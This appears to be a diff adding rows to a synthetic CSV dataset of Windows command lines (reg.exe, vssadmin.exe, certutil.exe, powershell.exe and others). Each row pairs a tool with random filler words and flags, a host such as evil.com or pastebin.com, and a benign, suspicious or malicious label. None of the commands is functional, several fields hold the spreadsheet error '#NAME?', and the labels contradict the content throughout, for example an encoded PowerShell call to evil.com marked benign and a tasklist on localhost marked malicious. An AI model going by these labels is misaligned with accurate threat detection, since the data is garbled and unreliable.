+"reg.exe energy -w,/nointeractive",Registry editor simulated command.,reg.exe,energy,none,none,localhost,"-w,/nointeractive",third,0.8,malicious
+"net.exe almost -nop,/nointeractive,-decode",Net command simulated command.,net.exe,almost,none,performance,localhost,"-nop,/nointeractive,-decode",none,0.1,benign
+"rundll32.exe affect -decode,-w",DLL runner simulated command.,rundll32.exe,affect,me,none,example.com,"-decode,-w",none,0.1,benign
+"systeminfo real /flushdns,-y,-w",System info simulated command.,systeminfo,real,none,none,evil.com,"/flushdns,-y,-w",none,0.1,benign
+"rundll32.exe none -encode,/c,-decode",DLL runner simulated command.,rundll32.exe,none,debate,none,evil.com,"-encode,/c,-decode",none,0.3,suspicious
+"vssadmin.exe all /c,-c,/nointeractive",Volume shadow service simulated command.,vssadmin.exe,all,none,none,localhost,"/c,-c,/nointeractive",none,0.3,suspicious
+"arp.exe similar -w,-decode,/f",ARP table simulated command.,arp.exe,similar,none,none,example.com,"-w,-decode,/f",himself,0.8,malicious
+"arp.exe set /priv,/flushdns",ARP table simulated command.,arp.exe,set,none,none,example.com,"/priv,/flushdns",none,0.3,suspicious
+tasklist.exe none /svc,Task listing simulated command.,tasklist.exe,none,none,none,localhost,/svc,none,0.3,suspicious
+"tasklist.exe similar /priv,/c",Task listing simulated command.,tasklist.exe,similar,forward,none,internal.local,"/priv,/c",none,0.3,suspicious
+certutil.exe even -recurse,Certificate utility simulated command.,certutil.exe,even,really,none,pastebin.com,#NAME?,none,0.1,benign
+"tasklist.exe hit /svc,/nointeractive,-recurse",Task listing simulated command.,tasklist.exe,hit,north,none,evil.com,"/svc,/nointeractive,-recurse",none,0.3,suspicious
+"reg.exe none /c,/add",Registry editor simulated command.,reg.exe,none,represent,rest,localhost,"/c,/add",everybody,0.8,malicious
+net.exe rate -decode,Net command simulated command.,net.exe,rate,none,none,pastebin.com,#NAME?,none,0.1,benign
+powershell.exe none /add,PowerShell-related simulated command.,powershell.exe,none,none,none,pastebin.com,/add,official,0.8,malicious
+"rundll32.exe draw /flushdns,-decode,/f",DLL runner simulated command.,rundll32.exe,draw,none,none,localhost,"/flushdns,-decode,/f",none,0.1,benign
+"powershell.exe none /nointeractive,-decode,/svc",PowerShell-related simulated command.,powershell.exe,none,accept,none,evil.com,"/nointeractive,-decode,/svc",thing,0.8,malicious
+"tasklist.exe activity -recurse,/nointeractive",Task listing simulated command.,tasklist.exe,activity,none,none,localhost,"-recurse,/nointeractive",none,0.1,benign
+"net.exe none /flushdns,/c",Net command simulated command.,net.exe,none,none,none,evil.com,"/flushdns,/c",none,0.3,suspicious
+net.exe none /c,Net command simulated command.,net.exe,none,left,none,localhost,/c,money,0.8,malicious
+"reg.exe federal /c,/f",Registry editor simulated command.,reg.exe,federal,none,do,none,"/c,/f",none,0.3,suspicious
+"systeminfo piece -nop,/svc,-encode",System info simulated command.,systeminfo,piece,none,none,example.com,"-nop,/svc,-encode",none,0.1,benign
+"wmic none -recurse,/svc,/nointeractive",WMIC tool simulated command.,wmic,none,none,none,evil.com,"-recurse,/svc,/nointeractive",none,0.3,suspicious
+"systeminfo recently -c,-y",System info simulated command.,systeminfo,recently,none,none,evil.com,"-c,-y",Mrs,0.8,malicious
+"certutil.exe example -y,-nop",Certificate utility simulated command.,certutil.exe,example,none,none,example.com,"-y,-nop",none,0.1,benign
+"whoami.exe young /svc,/nointeractive",User information simulated command.,whoami.exe,young,blue,none,evil.com,"/svc,/nointeractive",none,0.1,benign
+wevtutil.exe single -w,Event log query simulated command.,wevtutil.exe,single,none,none,internal.local,#NAME?,none,0.3,suspicious
+"powershell.exe none -encode,-w",PowerShell-related simulated command.,powershell.exe,none,none,need,pastebin.com,"-encode,-w",none,0.1,benign
+"reg.exe none /priv,-w,-y",Registry editor simulated command.,reg.exe,none,none,none,internal.local,"/priv,-w,-y",none,0.3,suspicious
+"vssadmin.exe none /c,/priv",Volume shadow service simulated command.,vssadmin.exe,none,site,none,example.com,"/c,/priv",natural,0.8,malicious
+"fsutil.exe budget -nop,/flushdns",File system utility simulated command.,fsutil.exe,budget,none,experience,none,"-nop,/flushdns",none,0.3,suspicious
+powershell.exe none -nop,PowerShell-related simulated command.,powershell.exe,none,although,none,none,#NAME?,none,0.3,suspicious
+"systeminfo coach /f,-c,/priv",System info simulated command.,systeminfo,coach,none,none,evil.com,"/f,-c,/priv",none,0.3,suspicious
+"wmic none /nointeractive,/f,-y",WMIC tool simulated command.,wmic,none,none,enough,evil.com,"/nointeractive,/f,-y",might,0.8,malicious
+wmic fund -recurse,WMIC tool simulated command.,wmic,fund,none,none,none,#NAME?,us,0.8,malicious
+"wmic none -decode,-recurse,-y",WMIC tool simulated command.,wmic,none,none,measure,localhost,"-decode,-recurse,-y",image,0.8,malicious
+"tasklist.exe none /svc,/nointeractive",Task listing simulated command.,tasklist.exe,none,third,police,example.com,"/svc,/nointeractive",none,0.1,benign
+"reg.exe none -w,/add",Registry editor simulated command.,reg.exe,none,reality,my,pastebin.com,"-w,/add",none,0.3,suspicious
+powershell.exe up -c,PowerShell-related simulated command.,powershell.exe,up,none,network,none,-c,Mrs,0.8,malicious
+vssadmin.exe behind -recurse,Volume shadow service simulated command.,vssadmin.exe,behind,none,none,evil.com,#NAME?,none,0.3,suspicious
+wevtutil.exe happy -encode,Event log query simulated command.,wevtutil.exe,happy,none,none,none,#NAME?,none,0.1,benign
+"vssadmin.exe none -y,-nop",Volume shadow service simulated command.,vssadmin.exe,none,none,better,localhost,"-y,-nop",approach,0.8,malicious
+reg.exe reality /add,Registry editor simulated command.,reg.exe,reality,deep,none,evil.com,/add,none,0.1,benign
+"rundll32.exe none /priv,/svc",DLL runner simulated command.,rundll32.exe,none,none,none,example.com,"/priv,/svc",none,0.1,benign
+"systeminfo personal -decode,/flushdns",System info simulated command.,systeminfo,personal,authority,none,example.com,"-decode,/flushdns",none,0.1,benign
+"net.exe none /flushdns,/f",Net command simulated command.,net.exe,none,none,none,internal.local,"/flushdns,/f",none,0.3,suspicious
+"whoami.exe none -recurse,-decode,-encode",User information simulated command.,whoami.exe,none,none,none,example.com,"-recurse,-decode,-encode",none,0.1,benign
+"whoami.exe window /nointeractive,-w",User information simulated command.,whoami.exe,window,none,none,pastebin.com,"/nointeractive,-w",none,0.1,benign
+"fsutil.exe home /svc,-decode,/add",File system utility simulated command.,fsutil.exe,home,west,none,example.com,"/svc,-decode,/add",none,0.3,suspicious
+"whoami.exe none /flushdns,/priv,-recurse",User information simulated command.,whoami.exe,none,none,none,evil.com,"/flushdns,/priv,-recurse",none,0.3,suspicious
+"whoami.exe none -decode,/flushdns",User information simulated command.,whoami.exe,none,none,none,example.com,"-decode,/flushdns",none,0.1,benign
+"arp.exe none -w,-recurse,-c",ARP table simulated command.,arp.exe,none,none,north,pastebin.com,"-w,-recurse,-c",none,0.3,suspicious
+"reg.exe none -encode,/priv",Registry editor simulated command.,reg.exe,none,skill,happen,evil.com,"-encode,/priv",none,0.3,suspicious
+"reg.exe none /add,/svc",Registry editor simulated command.,reg.exe,none,none,none,evil.com,"/add,/svc",none,0.1,benign
+reg.exe fight -recurse,Registry editor simulated command.,reg.exe,fight,none,none,internal.local,#NAME?,none,0.3,suspicious
+"fsutil.exe learn -decode,-nop,/c",File system utility simulated command.,fsutil.exe,learn,none,none,internal.local,"-decode,-nop,/c",none,0.1,benign
+"systeminfo letter /f,/nointeractive,/c",System info simulated command.,systeminfo,letter,none,none,internal.local,"/f,/nointeractive,/c",none,0.1,benign
+reg.exe ten /nointeractive,Registry editor simulated command.,reg.exe,ten,none,none,pastebin.com,/nointeractive,light,0.8,malicious
+"reg.exe summer -nop,/add",Registry editor simulated command.,reg.exe,summer,lawyer,arm,internal.local,"-nop,/add",none,0.1,benign
+"reg.exe none /f,/flushdns,-y",Registry editor simulated command.,reg.exe,none,north,none,localhost,"/f,/flushdns,-y",will,0.8,malicious
+rundll32.exe none -y,DLL runner simulated command.,rundll32.exe,none,none,none,none,#NAME?,young,0.8,malicious
+rundll32.exe none /nointeractive,DLL runner simulated command.,rundll32.exe,none,none,none,evil.com,/nointeractive,none,0.1,benign
+vssadmin.exe spend -c,Volume shadow service simulated command.,vssadmin.exe,spend,none,none,evil.com,-c,none,0.1,benign
+"net.exe itself -encode,/nointeractive",Net command simulated command.,net.exe,itself,none,from,internal.local,"-encode,/nointeractive",none,0.1,benign
+rundll32.exe none /f,DLL runner simulated command.,rundll32.exe,none,none,none,localhost,/f,none,0.1,benign
+powershell.exe none -encode,PowerShell-related simulated command.,powershell.exe,none,none,none,example.com,#NAME?,none,0.1,benign
+"reg.exe none -nop,/c",Registry editor simulated command.,reg.exe,none,responsibility,none,internal.local,"-nop,/c",none,0.3,suspicious
+wevtutil.exe none /flushdns,Event log query simulated command.,wevtutil.exe,none,buy,none,localhost,/flushdns,none,0.3,suspicious
+"whoami.exe none /f,-c,/c",User information simulated command.,whoami.exe,none,none,none,pastebin.com,"/f,-c,/c",none,0.3,suspicious
+"arp.exe none -c,-w,/svc",ARP table simulated command.,arp.exe,none,alone,none,example.com,"-c,-w,/svc",employee,0.8,malicious
